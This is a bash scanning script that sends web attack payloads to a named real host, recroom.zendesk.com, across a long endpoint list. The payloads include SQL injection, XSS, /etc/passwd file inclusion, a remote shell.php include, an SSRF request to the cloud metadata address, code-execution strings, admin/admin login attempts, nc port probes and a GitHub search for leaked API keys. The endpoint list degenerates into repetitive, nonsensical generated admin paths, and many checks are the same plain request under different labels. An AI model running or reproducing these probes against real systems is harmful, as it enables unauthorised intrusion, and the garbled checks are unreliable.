#!/bin/bash

# Output file
OUTPUT_FILE="recroom_zendesk_full_config_test_results.txt"

# Function to log messages
log_message() {
    echo "$1" >> $OUTPUT_FILE
}

# Function to test an endpoint for vulnerabilities
test_endpoint() {
    local endpoint=$1
    log_message "Testing endpoint: $endpoint"

    # Check for file upload vulnerabilities
    log_message "Checking for file upload vulnerabilities for $endpoint:"
    curl -s -F "file=@test.php" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for command injection
    log_message "Testing for command injection for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?cmd=ls" >> $OUTPUT_FILE 2>&1

    # Explore API endpoints for misconfigurations
    log_message "Exploring API endpoints for misconfigurations for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Check for deserialization vulnerabilities
    log_message "Checking for deserialization vulnerabilities for $endpoint:"
    curl -s -d "data=O:8:\"Exploit\":0:{}" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Check for third-party integrations
    log_message "Checking for third-party integrations for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint/api/v1/data" >> $OUTPUT_FILE 2>&1

    # Explore Rec Room game servers using nc
    log_message "Exploring Rec Room game servers for $endpoint using nc:"
    nc -zv recroom.zendesk.com 80 443 >> $OUTPUT_FILE 2>&1

    # Check for sensitive information in GitHub
    log_message "Checking for sensitive information in GitHub for $endpoint:"
    curl -s "https://github.com/search?q=recroom.zendesk.com+api+key" >> $OUTPUT_FILE 2>&1

    # Test interesting entries from robots.txt
    log_message "Testing interesting entries from robots.txt for $endpoint:"
    for param in "author" "tag" "month" "view" "format=json" "format=page-context" "format=main-content" "format=json-pretty" "format=ical" "reversePaginate"; do
        curl -s "https://recroom.zendesk.com$endpoint?$param=test" >> $OUTPUT_FILE 2>&1
    done

    # Test for SQL injection
    log_message "Testing for SQL injection for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?id=1' OR '1'='1" >> $OUTPUT_FILE 2>&1

    # Test for XSS
    log_message "Testing for XSS for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?q=<script>alert(1)</script>" >> $OUTPUT_FILE 2>&1

    # Test for LFI
    log_message "Testing for LFI for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1

    # Test for RFI
    log_message "Testing for RFI for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?file=http://example.com/shell.php" >> $OUTPUT_FILE 2>&1

    # Test for SSRF
    log_message "Testing for SSRF for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?url=http://169.254.169.254/" >> $OUTPUT_FILE 2>&1

    # Test for XXE
    log_message "Testing for XXE for $endpoint:"
    curl -s -d "@xxe_payload.xml" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for CSRF
    log_message "Testing for CSRF for $endpoint:"
    curl -s -X POST -d "csrf_token=test&action=delete" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Open Redirect
    log_message "Testing for Open Redirect for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1

    # Test for Path Traversal
    log_message "Testing for Path Traversal for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?file=../../../../etc/passwd" >> $OUTPUT_FILE 2>&1

    # Test for Remote Code Execution
    log_message "Testing for Remote Code Execution for $endpoint:"
    curl -s -d "code=system('ls')" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Insecure Direct Object Reference (IDOR)
    log_message "Testing for IDOR for $endpoint:"
    for id in 1 2; do
        curl -s "https://recroom.zendesk.com$endpoint?id=$id" >> $OUTPUT_FILE 2>&1
    done

    # Test for Broken Authentication
    log_message "Testing for Broken Authentication for $endpoint:"
    curl -s -d "username=admin&password=admin" "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Security Misconfiguration
    log_message "Testing for Security Misconfiguration for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Sensitive Data Exposure
    log_message "Testing for Sensitive Data Exposure for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Missing Function Level Access Control
    log_message "Testing for Missing Function Level Access Control for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Using Components with Known Vulnerabilities
    log_message "Testing for Using Components with Known Vulnerabilities for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint" >> $OUTPUT_FILE 2>&1

    # Test for Unvalidated Redirects and Forwards
    log_message "Testing for Unvalidated Redirects and Forwards for $endpoint:"
    curl -s "https://recroom.zendesk.com$endpoint?redirect=http://example.com" >> $OUTPUT_FILE 2>&1

    # Additional Vulnerability Checks
    # Check for HTTP Security Headers
    log_message "Checking for HTTP Security Headers for $endpoint:"
    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -E "X-Content-Type-Options|X-Frame-Options|Content-Security-Policy|Strict-Transport-Security|X-XSS-Protection" >> $OUTPUT_FILE 2>&1

    # Check for Clickjacking
    log_message "Checking for Clickjacking for $endpoint:"
    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "X-Frame-Options" >> $OUTPUT_FILE 2>&1

    # Check for HSTS
    log_message "Checking for HSTS for $endpoint:"
    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Strict-Transport-Security" >> $OUTPUT_FILE 2>&1

    # Check for CORS misconfigurations
    log_message "Checking for CORS misconfigurations for $endpoint:"
    curl -s -I "https://recroom.zendesk.com$endpoint" | grep -i "Access-Control-Allow-Origin" >> $OUTPUT_FILE 2>&1
}

# List of endpoints to test
ENDPOINTS=(
    "/children"
    "/groups"
    "/organizations"
    "/requests"
    "/registration"
    "/plans"
    "/accounts"
    "/account"
    "/proxy"
    "/rules"
    "/tags"
    "/ticket_fields"
    "/reports"
    "/search"
    "/slas"
    "/integrations"
    "/users"
    "/suspended_tickets"
    "/events"
    "/console"
    "/requests/*/satisfaction/"
    "/hc/activity"
    "/hc/change_language/"
    "/hc/communities/public/topics/*?*filter="
    "/hc/communities/public/questions$"
    "/hc/communities/public/questions?*filter="
    "/hc/communities/public/questions/unanswered"
    "/hc/*/signin"
    "/hc/requests/"
    "/hc/*/requests/"
    "/hc/*/search"
    "/access/normal"
    "/access/sso_bypass"
    "/access/unauthenticated"
    "/theming"
    "/knowledge"
    "/access/"
    "/auth/"
    "/cdn-cgi/"
    "/tickets"
    "/api/v1"
    "/api/v2"
    "/api/v3"
    "/api/v4"
    "/api/v5"
    "/aadmin"
    "/admin"
    "/administrator"
    "/backup"
    "/cgi-bin"
    "/config"
    "/console"
    "/dashboard"
    "/db"
    "/debug"
    "/editor"
    "/ftp"
    "/git"
    "/install"
    "/login"
    "/manager"
    "/phpmyadmin"
    "/setup"
    "/ssh"
    "/status"
    "/svn"
    "/test"
    "/upload"
    "/user"
    "/web"
    "/wp-admin"
    "/wp-content"
    "/wp-includes"
    "/.env"
    "/.git"
    "/.svn"
    "/.htaccess"
    "/.htpasswd"
    "/.bash_history"
    "/.ssh"
    "/.well-known"
    "/robots.txt"
    "/sitemap.xml"
    "/crossdomain.xml"
    "/clientaccesspolicy.xml"
    "/favicon.ico"
    "/humans.txt"
    "/README.md"
    "/LICENSE.md"
    "/CHANGELOG.md"
    "/CONTRIBUTING.md"
    "/CODE_OF_CONDUCT.md"
    "/SECURITY.md"
    "/panel"
    "/control"
    "/manage"
    "/settings"
    "/configurations"
    "/preferences"
    "/profile"
    "/account-settings"
    "/user-settings"
    "/admin-panel"
    "/control-panel"
    "/management"
    "/system"
    "/dashboard-admin"
    "/admin-dashboard"
    "/admin-control"
    "/admin-settings"
    "/admin-config"
    "/admin-preferences"
    "/admin-profile"
    "/admin-account"
    "/admin-user"
    "/admin-system"
    "/admin-management"
    "/admin-dashboard"
    "/admin-control-panel"
    "/admin-management-panel"
    "/admin-system-panel"
    "/admin-dashboard-panel"
    "/admin-control-dashboard"
    "/admin-management-dashboard"
    "/admin-system-dashboard"
    "/admin-panel-dashboard"
    "/admin-control-panel-dashboard"
    "/admin-management-panel-dashboard"
    "/admin-system-panel-dashboard"
    "/admin-dashboard-control-panel"
    "/admin-dashboard-management-panel"
    "/admin-dashboard-system-panel"
    "/admin-dashboard-panel-control"
    "/admin-dashboard-panel-management"
    "/admin-dashboard-panel-system"
    "/admin-dashboard-control-panel-management"
    "/admin-dashboard-control-panel-system"
    "/admin-dashboard-management-panel-control"
    "/admin-dashboard-management-panel-system"
    "/admin-dashboard-system-panel-control"
    "/admin-dashboard-system-panel-management"
    "/admin-dashboard-control-management-system"
    "/admin-dashboard-management-control-system"
    "/admin-dashboard-system-control-management"
    "/admin-dashboard-control-system-management"
    "/admin-dashboard-management-system-control"
    "/admin-dashboard-system-management-control"
    "/admin-dashboard-control-system-management-panel"
    "/admin-dashboard-management-system-control-panel"
    "/admin-dashboard-system-management-control-panel"
    "/admin-dashboard-control-management-system-panel"
    "/admin-dashboard-management-control-system-panel"
    "/admin-dashboard-system-control-management-panel"
    "/admin-dashboard-control-system-management-panel-dashboard"
    "/admin-dashboard-management-system-control-panel-dashboard"
    "/admin-dashboard-system-management-control-panel-dashboard"
    "/admin-dashboard-control-management-system-panel-dashboard"
    "/admin-dashboard-management-control-system-panel-dashboard"
    "/admin-dashboard-system-control-management-panel-dashboard"
    "/admin-dashboard-control-system-management-panel-dashboard-admin"
    "/admin-dashboard-management-system-control-panel-dashboard-admin"
    "/admin-dashboard-system-management-control-panel-dashboard-admin"
    "/admin-dashboard-control-management-system-panel-dashboard-admin"
    "/admin-dashboard-management-control-system-panel-dashboard-admin"
    "/admin-dashboard-system-control-management-panel-dashboard-admin"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control"
    "/admin-dashboard-control-management-panel-dashboard-admin-control-panel"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel-management"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-system-management-control-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-management-control-system-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-system-control-management-panel-dashboard-admin-control-panel-management-system"
    "/admin-dashboard-control-management-system-panel-dashboard-admin-control-panel-management-system-control"
    "/admin-dashboard-management-system-control-panel-dashboard-admin-control-panel-management-system-control"
)

# Loop through each endpoint and test for vulnerabilities
for endpoint in "${ENDPOINTS[@]}"; do
    test_endpoint "$endpoint"
done

log_message "Testing completed."
